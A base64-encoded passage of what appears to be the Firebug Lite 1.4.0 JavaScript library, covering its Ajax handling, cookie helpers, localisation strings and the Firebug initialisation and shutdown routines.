9IEZCTC5BamF4LnNlcmlhbGl6ZShyLmRhdGEpKQ0KICAgICAgICAgICAgdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCByLmNvbnRlbnRUeXBlKTsNCiAgICANCiAgICAgICAgLyoqIEBpZ25vcmUgKi8NCiAgICAgICAgLy8gb25yZWFkeXN0YXRlY2hhbmdlIGhhbmRsZXINCiAgICAgICAgdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpDQogICAgICAgIHsgDQogICAgICAgICAgICBGQkwuQWpheC5vblN0YXRlQ2hhbmdlKHIpOyANCiAgICAgICAgfTsgDQogICAgDQogICAgICAgIC8vIHNlbmQgdGhlIHJlcXVlc3QNCiAgICAgICAgdC5zZW5kKGRhdGEpOw0KICAgIH0sDQogIA0KICAgIC8qKg0KICAgICAqIEhhbmRsZXMgdGhlIHN0YXRlIGNoYW5nZQ0KICAgICAqLyAgICAgDQogICAgb25TdGF0ZUNoYW5nZTogZnVuY3Rpb24ob3B0aW9ucykNCiAgICB7DQogICAgICAgIHZhciBmbiwgbyA9IG9wdGlvbnMsIHQgPSB0aGlzLnRyYW5zcG9ydDsNCiAgICAgICAgdmFyIHN0YXRlID0gdGhpcy5nZXRTdGF0ZSh0KTsgDQogICAgDQogICAgICAgIGlmIChmbiA9IG9bIm9uIiArIHN0YXRlXSkgZm4odGhpcy5nZXRSZXNwb25zZShvKSwgbyk7DQogICAgDQogICAgICAgIGlmIChzdGF0ZSA9PSAiQ29tcGxldGUiKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgc3VjY2VzcyA9IHQuc3RhdHVzID09IDIwMCwgcmVzcG9uc2UgPSB0aGlzLmdldFJlc3BvbnNlKG8pOw0KICAgICAgDQogICAgICAgICAgICBpZiAoZm4gPSBvWyJvblVwZGF0ZSJdKQ0KICAgICAgICAgICAgICBmbihyZXNwb25zZSwgbyk7DQogICAgICANCiAgICAgICAgICAgIGlmIChmbiA9IG9bIm9uIiArIChzdWNjZXNzID8gIlN1Y2Nlc3MiIDogIkZhaWx1cmUiKV0pDQogICAgICAgICAgICAgIGZuKHJlc3BvbnNlLCBvKTsNCiAgICAgIA0KICAgICAgICAgICAgdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBGQkwuZW1wdHlGbjsNCiAgICAgIA0KICAgICAgICAgICAgaWYgKHRoaXMucmVxdWVzdHMubGVuZ3RoID4gMCkgDQogICAgICAgICAgICAgICAgc2V0VGltZW91dCh0aGlzLnNlbmRSZXF1ZXN0LCAxMCk7DQogICAgICAgIH0NCiAgICB9LA0KICANCiAgICAvKioNCiAgICAgKiBnZXRzIHRoZSBhcHByb3ByaWF0ZSByZXNwb25zZSB2YWx1ZSBhY2NvcmRpbmcgdGhlIHR5cGUNCiAgICAgKi8NCiAgICBnZXRSZXNwb25zZTogZnVuY3Rpb24ob3B0aW9ucykNCiAgICB7DQogICAgICAgIHZhciB0ID0gdGhpcy50cmFuc3BvcnQsIHR5cGUgPSBvcHRpb25zLmRhdGFUeXBlOw0KICAgIA0KICAgICAgICBpZiAgICAgICh0LnN0YXR1cyAhPSAyMDApIHJldHVybiB0LnN0YXR1c1RleHQ7DQogICAgICAgIGVsc2UgaWYgKHR5cGUgPT0gInRleHQiKSAgcmV0dXJuIHQucmVzcG9uc2VUZXh0Ow0KICAgICAgICBlbHNlIGlmICh0eXBlID09ICJodG1sIikgIHJldHVybiB0LnJlc3BvbnNlVGV4dDsNCiAgICAgICAgZWxzZSBpZiAodHlwZSA9PSAieG1sIikgICByZXR1cm4gdC5yZXNwb25zZVhNTDsNCiAgICAgICAgZWxzZSBpZiAodHlwZSA9PSAianNvbiIpICByZXR1cm4gZXZhbCgiKCIgKyB0LnJlc3BvbnNlVGV4dCArICIpIik7DQogICAgfSwNCiAgDQogICAgLyoqDQogICAgICogcmV0dXJucyB0aGUgY3VycmVudCBzdGF0ZSBvZiB0aGUgWEhSIG9iamVjdA0KICAgICAqLyAgICAgDQogICAgZ2V0U3RhdGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLnN0YXRlc1t0aGlzLnRyYW5zcG9ydC5yZWFkeVN0YXRlXTsNCiAgICB9DQogIA0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvb2tpZSwgZnJvbSBodHRwOi8vd3d3LnF1aXJrc21vZGUub3JnL2pzL2Nvb2tpZXMuaHRtbA0KDQp0aGlzLmNyZWF0ZUNvb2tpZSA9IGZ1bmN0aW9uKG5hbWUsdmFsdWUsZGF5cykNCnsNCiAgICBpZiAoJ2Nvb2tpZScgaW4gZG9jdW1lbnQpDQogICAgew0KICAgICAgICBpZiAoZGF5cykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGRhdGUgPSBuZXcgRGF0ZSgpOw0KICAgICAgICAgICAgZGF0ZS5zZXRUaW1lKGRhdGUuZ2V0VGltZSgpKyhkYXlzKjI0KjYwKjYwKjEwMDApKTsNCiAgICAgICAgICAgIHZhciBleHBpcmVzID0gIjsgZXhwaXJlcz0iK2RhdGUudG9HTVRTdHJpbmcoKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIA0KICAgICAgICAgICAgdmFyIGV4cGlyZXMgPSAiIjsNCiAgICAgICAgDQogICAgICAgIGRvY3VtZW50LmNvb2tpZSA9IG5hbWUrIj0iK3ZhbHVlK2V4cGlyZXMrIjsgcGF0aD0vIjsNCiAgICB9DQp9Ow0KDQp0aGlzLnJlYWRDb29raWUgPSBmdW5jdGlvbiAobmFtZSkNCnsNCiAgICBpZiAoJ2Nvb2tpZScgaW4gZG9jdW1lbnQpDQogICAgew0KICAgICAgICB2YXIgbmFtZUVRID0gbmFtZSArICI9IjsNCiAgICAgICAgdmFyIGNhID0gZG9jdW1lbnQuY29va2llLnNwbGl0KCc7Jyk7DQogICAgICAgIA0KICAgICAgICBmb3IodmFyIGk9MDsgaSA8IGNhLmxlbmd0aDsgaSsrKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgYyA9IGNhW2ldOw0KICAgICAgICAgICAgd2hpbGUgKGMuY2hhckF0KDApPT0nICcpIGMgPSBjLnN1YnN0cmluZygxLGMubGVuZ3RoKTsNCiAgICAgICAgICAgIGlmIChjLmluZGV4T2YobmFtZUVRKSA9PSAwKSByZXR1cm4gYy5zdWJzdHJpbmcobmFtZUVRLmxlbmd0aCxjLmxlbmd0aCk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIG51bGw7DQp9Ow0KDQp0aGlzLnJlbW92ZUNvb2tpZSA9IGZ1bmN0aW9uKG5hbWUpDQp7DQogICAgdGhpcy5jcmVhdGVDb29raWUobmFtZSwgIiIsIC0xKTsNCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBodHRwOi8vd3d3Lm1pc3Rlci1waXhlbC5jb20vI0NvbnRlbnRfX3N0YXRlPWlzX3RoYXRfc2ltcGxlDQp2YXIgZml4SUU2QmFja2dyb3VuZEltYWdlQ2FjaGUgPSBmdW5jdGlvbihkb2MpDQp7DQogICAgZG9jID0gZG9jIHx8IGRvY3VtZW50Ow0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgZG9jLmV4ZWNDb21tYW5kKCJCYWNrZ3JvdW5kSW1hZ2VDYWNoZSIsIGZhbHNlLCB0cnVlKTsNCiAgICB9IA0KICAgIGNhdGNoKEUpDQogICAgew0KICAgICAgICANCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIGNhbGN1bGF0ZVBpeGVsc1BlckluY2gNCg0KdmFyIHJlc2V0U3R5bGUgPSAibWFyZ2luOjA7IHBhZGRpbmc6MDsgYm9yZGVyOjA7IHBvc2l0aW9uOmFic29sdXRlOyBvdmVyZmxvdzpoaWRkZW47IGRpc3BsYXk6YmxvY2s7IjsNCg0KdmFyIGNhbGN1bGF0ZVBpeGVsc1BlckluY2ggPSBmdW5jdGlvbiBjYWxjdWxhdGVQaXhlbHNQZXJJbmNoKGRvYywgYm9keSkNCnsNCiAgICB2YXIgaW5jaCA9IEZCTC5jcmVhdGVHbG9iYWxFbGVtZW50KCJkaXYiKTsNCiAgICBpbmNoLnN0eWxlLmNzc1RleHQgPSByZXNldFN0eWxlICsgIndpZHRoOjFpbjsgaGVpZ2h0OjFpbjsgcG9zaXRpb246YWJzb2x1dGU7IHRvcDotMTIzNHB4OyBsZWZ0Oi0xMjM0cHg7IjsNCiAgICBib2R5LmFwcGVuZENoaWxkKGluY2gpOw0KICAgIA0KICAgIEZCTC5waXhlbHNQZXJJbmNoID0gew0KICAgICAgICB4OiBpbmNoLm9mZnNldFdpZHRoLA0KICAgICAgICB5OiBpbmNoLm9mZnNldEhlaWdodA0KICAgIH07DQogICAgDQogICAgYm9keS5yZW1vdmVDaGlsZChpbmNoKTsNCn07DQoNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdGhpcy5Tb3VyY2VMaW5rID0gZnVuY3Rpb24odXJsLCBsaW5lLCB0eXBlLCBvYmplY3QsIGluc3RhbmNlKQ0Kew0KICAgIHRoaXMuaHJlZiA9IHVybDsNCiAgICB0aGlzLmluc3RhbmNlID0gaW5zdGFuY2U7DQogICAgdGhpcy5saW5lID0gbGluZTsNCiAgICB0aGlzLnR5cGUgPSB0eXBlOw0KICAgIHRoaXMub2JqZWN0ID0gb2JqZWN0Ow0KfTsNCg0KdGhpcy5Tb3VyY2VMaW5rLnByb3RvdHlwZSA9DQp7DQogICAgdG9TdHJpbmc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLmhyZWY7DQogICAgfSwNCiAgICB0b0pTT046IGZ1bmN0aW9uKCkgLy8gdW50aWwgMy4xLi4uDQogICAgew0KICAgICAgICByZXR1cm4gIntcImhyZWZcIjpcIiIrdGhpcy5ocmVmKyJcIiwgIisNCiAgICAgICAgICAgICh0aGlzLmxpbmU/KCJcImxpbmVcIjoiK3RoaXMubGluZSsiLCIpOiIiKSsNCiAgICAgICAgICAgICh0aGlzLnR5cGU/KCIgXCJ0eXBlXCI6XCIiK3RoaXMudHlwZSsiXCIsIik6IiIpKw0KICAgICAgICAgICAgICAgICAgICAifSI7DQogICAgfQ0KDQp9Ow0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp0aGlzLlNvdXJjZVRleHQgPSBmdW5jdGlvbihsaW5lcywgb3duZXIpDQp7DQogICAgdGhpcy5saW5lcyA9IGxpbmVzOw0KICAgIHRoaXMub3duZXIgPSBvd25lcjsNCn07DQoNCnRoaXMuU291cmNlVGV4dC5nZXRMaW5lQXNIVE1MID0gZnVuY3Rpb24obGluZU5vKQ0Kew0KICAgIHJldHVybiBlc2NhcGVGb3JTb3VyY2VMaW5lKHRoaXMubGluZXNbbGluZU5vLTFdKTsNCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9KS5hcHBseShGQkwpOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyggLyoqIEBzY29wZSBzX2kxOG4gKi8gZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8vIFRPRE86IHh4eHBlZHJvIGxvY2FsaXphdGlvbg0KdmFyIG9TVFIgPQ0Kew0KICAgICJOb01lbWJlcnNXYXJuaW5nIjogIlRoZXJlIGFyZSBubyBwcm9wZXJ0aWVzIHRvIHNob3cgZm9yIHRoaXMgb2JqZWN0LiIsDQogICAgDQogICAgIkVtcHR5U3R5bGVTaGVldCI6ICJUaGVyZSBhcmUgbm8gcnVsZXMgaW4gdGhpcyBzdHlsZXNoZWV0LiIsDQogICAgIkVtcHR5RWxlbWVudENTUyI6ICJUaGlzIGVsZW1lbnQgaGFzIG5vIHN0eWxlIHJ1bGVzLiIsDQogICAgIkFjY2Vzc1Jlc3RyaWN0ZWQiOiAiQWNjZXNzIHRvIHJlc3RyaWN0ZWQgVVJJIGRlbmllZC4iLA0KICAgIA0KICAgICJuZXQubGFiZWwuUGFyYW1ldGVycyI6ICJQYXJhbWV0ZXJzIiwNCiAgICAibmV0LmxhYmVsLlNvdXJjZSI6ICJTb3VyY2UiLA0KICAgICJVUkxQYXJhbWV0ZXJzIjogIlBhcmFtcyIsDQogICAgDQogICAgIkVkaXRTdHlsZSI6ICJFZGl0IEVsZW1lbnQgU3R5bGUuLi4iLA0KICAgICJOZXdSdWxlIjogIk5ldyBSdWxlLi4uIiwNCiAgICANCiAgICAiTmV3UHJvcCI6ICJOZXcgUHJvcGVydHkuLi4iLA0KICAgICJFZGl0UHJvcCI6ICdFZGl0ICIlcyInLA0KICAgICJEZWxldGVQcm9wIjogJ0RlbGV0ZSAiJXMiJywNCiAgICAiRGlzYWJsZVByb3AiOiAnRGlzYWJsZSAiJXMiJw0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZCTC4kU1RSID0gZnVuY3Rpb24obmFtZSkNCnsNCiAgICByZXR1cm4gb1NUUi5oYXNPd25Qcm9wZXJ0eShuYW1lKSA/IG9TVFJbbmFtZV0gOiBuYW1lOw0KfTsNCg0KRkJMLiRTVFJGID0gZnVuY3Rpb24obmFtZSwgYXJncykNCnsNCiAgICBpZiAoIW9TVFIuaGFzT3duUHJvcGVydHkobmFtZSkpIHJldHVybiBuYW1lOw0KICAgIA0KICAgIHZhciBmb3JtYXQgPSBvU1RSW25hbWVdOw0KICAgIHZhciBvYmpJbmRleCA9IDA7DQogICAgDQogICAgdmFyIHBhcnRzID0gcGFyc2VGb3JtYXQoZm9ybWF0KTsNCiAgICB2YXIgdHJpYWxJbmRleCA9IG9iakluZGV4Ow0KICAgIHZhciBvYmplY3RzID0gYXJnczsNCiAgICANCiAgICBmb3IgKHZhciBpPSAwOyBpIDwgcGFydHMubGVuZ3RoOyBpKyspDQogICAgew0KICAgICAgICB2YXIgcGFydCA9IHBhcnRzW2ldOw0KICAgICAgICBpZiAocGFydCAmJiB0eXBlb2YocGFydCkgPT0gIm9iamVjdCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICgrK3RyaWFsSW5kZXggPiBvYmplY3RzLmxlbmd0aCkgIC8vIHRoZW4gdG9vIGZldyBwYXJhbWV0ZXJzIGZvciBmb3JtYXQsIGFzc3VtZSB1bmZvcm1hdHRlZC4NCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSAiIjsNCiAgICAgICAgICAgICAgICBvYmpJbmRleCA9IC0xOw0KICAgICAgICAgICAgICAgIHBhcnRzLmxlbmd0aCA9IDA7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgIH0NCiAgICANCiAgICB2YXIgcmVzdWx0ID0gW107DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwYXJ0cy5sZW5ndGg7ICsraSkNCiAgICB7DQogICAgICAgIHZhciBwYXJ0ID0gcGFydHNbaV07DQogICAgICAgIGlmIChwYXJ0ICYmIHR5cGVvZihwYXJ0KSA9PSAib2JqZWN0IikNCiAgICAgICAgew0KICAgICAgICAgICAgcmVzdWx0LnB1c2goIiIrYXJncy5zaGlmdCgpKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXN1bHQucHVzaChwYXJ0KTsNCiAgICB9DQogICAgDQogICAgcmV0dXJuIHJlc3VsdC5qb2luKCIiKTsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp2YXIgcGFyc2VGb3JtYXQgPSBmdW5jdGlvbiBwYXJzZUZvcm1hdChmb3JtYXQpDQp7DQogICAgdmFyIHBhcnRzID0gW107DQogICAgaWYgKGZvcm1hdC5sZW5ndGggPD0gMCkNCiAgICAgICAgcmV0dXJuIHBhcnRzOw0KDQogICAgdmFyIHJlZyA9IC8oKF4lfC4lKShcZCspPyhcLikoW2EtekEtWl0pKXwoKF4lfC4lKShbYS16QS1aXSkpLzsNCiAgICBmb3IgKHZhciBtID0gcmVnLmV4ZWMoZm9ybWF0KTsgbTsgbSA9IHJlZy5leGVjKGZvcm1hdCkpDQogICAgew0KICAgICAgICBpZiAobVswXS5zdWJzdHIoMCwgMikgPT0gIiUlIikNCiAgICAgICAgew0KICAgICAgICAgICAgcGFydHMucHVzaChmb3JtYXQuc3Vic3RyKDAsIG0uaW5kZXgpKTsNCiAgICAgICAgICAgIHBhcnRzLnB1c2gobVswXS5zdWJzdHIoMSkpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHR5cGUgPSBtWzhdID8gbVs4XSA6IG1bNV07DQogICAgICAgICAgICB2YXIgcHJlY2lzaW9uID0gbVszXSA/IHBhcnNlSW50KG1bM10pIDogKG1bNF0gPT0gIi4iID8gLTEgOiAwKTsNCg0KICAgICAgICAgICAgdmFyIHJlcCA9IG51bGw7DQogICAgICAgICAgICBzd2l0Y2ggKHR5cGUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2FzZSAicyI6DQogICAgICAgICAgICAgICAgICAgIHJlcCA9IEZpcmVidWdSZXBzLlRleHQ7DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIGNhc2UgImYiOg0KICAgICAgICAgICAgICAgIGNhc2UgImkiOg0KICAgICAgICAgICAgICAgIGNhc2UgImQiOg0KICAgICAgICAgICAgICAgICAgICByZXAgPSBGaXJlYnVnUmVwcy5OdW1iZXI7DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIGNhc2UgIm8iOg0KICAgICAgICAgICAgICAgICAgICByZXAgPSBudWxsOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcGFydHMucHVzaChmb3JtYXQuc3Vic3RyKDAsIG1bMF1bMF0gPT0gIiUiID8gbS5pbmRleCA6IG0uaW5kZXgrMSkpOw0KICAgICAgICAgICAgcGFydHMucHVzaCh7cmVwOiByZXAsIHByZWNpc2lvbjogcHJlY2lzaW9uLCB0eXBlOiAoIiUiICsgdHlwZSl9KTsNCiAgICAgICAgfQ0KDQogICAgICAgIGZvcm1hdCA9IGZvcm1hdC5zdWJzdHIobS5pbmRleCttWzBdLmxlbmd0aCk7DQogICAgfQ0KDQogICAgcGFydHMucHVzaChmb3JtYXQpOw0KICAgIHJldHVybiBwYXJ0czsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyggLyoqIEBzY29wZSBzX2ZpcmVidWcgKi8gZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gR2xvYmFscw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gSW50ZXJuYWxzDQoNCnZhciBtb2R1bGVzID0gW107DQp2YXIgcGFuZWxUeXBlcyA9IFtdOw0KdmFyIHBhbmVsVHlwZU1hcCA9IHt9Ow0KdmFyIHJlcHMgPSBbXTsNCg0KdmFyIHBhcmVudFBhbmVsTWFwID0ge307DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBGaXJlYnVnDQoNCi8qKg0KICogQG5hbWVzcGFjZSBkZXNjcmliZSBGaXJlYnVnDQogKiBAZXhwb3J0cyBGQkwuRmlyZWJ1ZyBhcyBGaXJlYnVnDQogKi8NCkZCTC5GaXJlYnVnID0gDQp7DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIHZlcnNpb246ICAiRmlyZWJ1ZyBMaXRlIDEuNC4wIiwNCiAgICByZXZpc2lvbjogIiRSZXZpc2lvbjogMTE5NjcgJCIsDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIG1vZHVsZXM6IG1vZHVsZXMsDQogICAgcGFuZWxUeXBlczogcGFuZWxUeXBlcywNCiAgICBwYW5lbFR5cGVNYXA6IHBhbmVsVHlwZU1hcCwNCiAgICByZXBzOiByZXBzLA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBJbml0aWFsaXphdGlvbg0KICAgIA0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFKSBGQlRyYWNlLnN5c291dCgiRmlyZWJ1Zy5pbml0aWFsaXplIiwgImluaXRpYWxpemluZyBhcHBsaWNhdGlvbiIpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5icm93c2VyID0gbmV3IENvbnRleHQoRW52LmJyb3dzZXIpOw0KICAgICAgICBGaXJlYnVnLmNvbnRleHQgPSBGaXJlYnVnLmJyb3dzZXI7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLmxvYWRQcmVmcygpOw0KICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuaXNPcGVuID0gZmFsc2U7DQogICAgICAgIA0KICAgICAgICAvLyBEb2N1bWVudCBtdXN0IGJlIGNhY2hlZCBiZWZvcmUgY2hyb21lIGluaXRpYWxpemF0aW9uDQogICAgICAgIGNhY2hlRG9jdW1lbnQoKTsNCiAgICAgICAgDQogICAgICAgIGlmIChGaXJlYnVnLkluc3BlY3RvciAmJiBGaXJlYnVnLkluc3BlY3Rvci5jcmVhdGUpDQogICAgICAgICAgICBGaXJlYnVnLkluc3BlY3Rvci5jcmVhdGUoKTsNCiAgICAgICAgDQogICAgICAgIGlmIChGQkwuQ3NzQW5hbHl6ZXIgJiYgRkJMLkNzc0FuYWx5emVyLnByb2Nlc3NBbGxTdHlsZVNoZWV0cykNCiAgICAgICAgICAgIEZCTC5Dc3NBbmFseXplci5wcm9jZXNzQWxsU3R5bGVTaGVldHMoRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50KTsNCiAgICAgICAgDQogICAgICAgIEZpcmVidWdDaHJvbWUuaW5pdGlhbGl6ZSgpOw0KICAgICAgICANCiAgICAgICAgZGlzcGF0Y2gobW9kdWxlcywgImluaXRpYWxpemUiLCBbXSk7DQogICAgICAgIA0KICAgICAgICBpZiAoRmlyZWJ1Zy5kaXNhYmxlUmVzb3VyY2VGZXRjaGluZykNCiAgICAgICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2dGb3JtYXR0ZWQoWyJTb21lIEZpcmVidWcgTGl0ZSBmZWF0dXJlcyBhcmUgbm90IHdvcmtpbmcgYmVjYXVzZSAiICsNCiAgICAgICAgICAgIAkJInJlc291cmNlIGZldGNoaW5nIGlzIGRpc2FibGVkLiBUbyBlbmFibGVkIGl0IHNldCB0aGUgRmlyZWJ1ZyBMaXRlIG9wdGlvbiAiICsNCiAgICAgICAgICAgIAkJIlwiZGlzYWJsZVJlc291cmNlRmV0Y2hpbmdcIiB0byBcImZhbHNlXCIuIE1vcmUgaW5mbyBhdCAiICsNCiAgICAgICAgICAgIAkJImh0dHA6Ly9nZXRmaXJlYnVnLmNvbS9maXJlYnVnbGl0ZSNPcHRpb25zIl0sIA0KICAgICAgICAgICAgCQlGaXJlYnVnLmNvbnRleHQsICJ3YXJuIik7DQogICAgICAgIA0KICAgICAgICBpZiAoRW52Lm9uTG9hZCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG9uTG9hZCA9IEVudi5vbkxvYWQ7DQogICAgICAgICAgICBkZWxldGUgRW52Lm9uTG9hZDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgc2V0VGltZW91dChvbkxvYWQsIDIwMCk7DQogICAgICAgIH0NCiAgICB9LA0KICANCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKEZpcmVidWcuc2F2ZUNvb2tpZXMpDQogICAgICAgICAgICBGaXJlYnVnLnNhdmVQcmVmcygpOw0KICAgICAgICANCiAgICAgICAgaWYgKEZpcmVidWcuSW5zcGVjdG9yKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5JbnNwZWN0b3IuZGVzdHJveSgpOw0KICAgICAgICANCiAgICAgICAgZGlzcGF0Y2gobW9kdWxlcywgInNodXRkb3duIiwgW10pOw0KICAgICAgICANCiAgICAgICAgdmFyIGNocm9tZU1hcCA9IEZpcmVidWdDaHJvbWUuY2hyb21lTWFwOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBjaHJvbWVNYXApDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChjaHJvbWVNYXAuaGFzT3duUHJvcGVydHkobmFtZSkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjaHJvbWVNYXBbbmFtZV0uZGVzdHJveSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaChFKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUykgRkJUcmFjZS5zeXNvdXQoImNocm9tZS5kZXN0cm95KCkgZmFpbGVkIHRvOiAiICsgbmFtZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLkxpdGUuQ2FjaGUuRWxlbWVudC5jbGVhcigpOw0KICAgICAgICBGaXJlYnVnLkxpdGUuQ2FjaGUuU3R5bGVTaGVldC5jbGVhcigpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5icm93c2VyID0gbnVsbDsNCiAgICAgICAgRmlyZWJ1Zy5jb250ZXh0ID0gbnVsbDsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIFJlZ2lzdHJhdGlvbg0KDQogICAgcmVnaXN0ZXJNb2R1bGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIG1vZHVsZXMucHVzaC5hcHBseShtb2R1bGVzLCBhcmd1bWVudHMpOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFKSBGQlRyYWNlLnN5c291dCgiRmlyZWJ1Zy5yZWdpc3Rlck1vZHVsZSIpOw0KICAgIH0sDQoNCiAgICByZWdpc3RlclBhbmVsOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBwYW5lbFR5cGVzLnB1c2guYXBwbHkocGFuZWxUeXBlcywgYXJndW1lbnRzKTsNCg0KICAgICAgICBmb3IgKHZhciBpID0gMCwgcGFuZWxUeXBlOyBwYW5lbFR5cGUgPSBhcmd1